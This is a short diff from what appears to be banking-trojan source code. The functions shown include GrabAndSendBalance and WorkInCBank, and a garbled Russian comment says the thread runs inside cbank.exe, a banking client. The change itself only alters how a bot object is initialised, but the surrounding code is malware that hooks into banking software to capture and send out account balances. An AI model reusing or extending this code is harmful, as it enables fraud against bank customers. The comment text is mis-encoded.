@@ -172,7 +172,7 @@ static DWORD WINAPI GrabAndSendBalance(void*)
 //поток исполн€ющийс€ внутри cbank.exe (cbmain.ex)
 static DWORD WINAPI WorkInCBank(void*)
 {
-	BOT::Initialize();
+	BOT::Initialize(ProcessUnknown);
 	if( !InitData() ) return 0;
 	char folderCBank[MAX_PATH];
 	pGetModuleFileNameA( 0, folderCBank, sizeof(folderCBank) );
